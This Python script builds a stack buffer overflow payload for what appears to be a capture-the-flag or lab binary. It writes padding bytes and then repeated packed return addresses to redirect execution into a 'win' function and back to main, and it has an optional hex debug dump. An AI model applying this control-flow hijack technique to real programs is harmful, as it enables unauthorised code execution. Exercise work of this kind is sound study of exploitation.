from __future__ import print_function
import struct
import sys
import textwrap

debug = "-d" in sys.argv
python_3 = sys.version[0] == "3"
payload_printer = sys.stdout.buffer.write if python_3 else print

win_addr = struct.pack("I", 0x080485db)
main_success_addr = struct.pack("I", 0x0804883b)
buffer_padding = b"\x41" * 16
rest_padding = b"\x42" * 4 * 3
payload = buffer_padding + rest_padding + 5 * win_addr + main_success_addr
payload_printer(payload)

if debug:
    if python_3:
        debug_str = ["0x{0:0{1}X}".format(c,2) for c in payload]
        width = next(i for i in range(10, 5, -1) if len(debug_str) % i == 0)
        print("\n", *textwrap.wrap(" ".join(debug_str), 5 * width), sep="\n")
    else:
        print([c for c in payload])